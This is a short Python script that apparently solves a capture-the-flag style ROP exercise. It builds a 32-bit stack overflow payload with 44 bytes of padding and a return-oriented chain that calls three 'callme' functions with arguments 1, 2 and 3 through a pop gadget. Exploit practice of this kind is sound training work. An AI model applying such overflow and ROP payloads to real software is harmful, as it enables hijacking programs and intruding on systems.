import struct
crap = "A" *44

def stringpacker(addr):

    return str(struct.pack("<I",addr))

callmeOneAddr = 0x080485c0
callmeTwoAddr = 0x08048620
callmeThreeAddr = 0x080485b0
threetimesPopGadget = 0x080488a9



callmeone = stringpacker(callmeOneAddr)
callmetwo = stringpacker(callmeTwoAddr)
callmethree = stringpacker(callmeThreeAddr)
popGadget = stringpacker(threetimesPopGadget)


params = stringpacker(1) + stringpacker(2) + stringpacker(3)

payload = crap

payload += callmeone + popGadget + params
payload += callmetwo + popGadget + params
payload += callmethree + popGadget + params

print(payload)

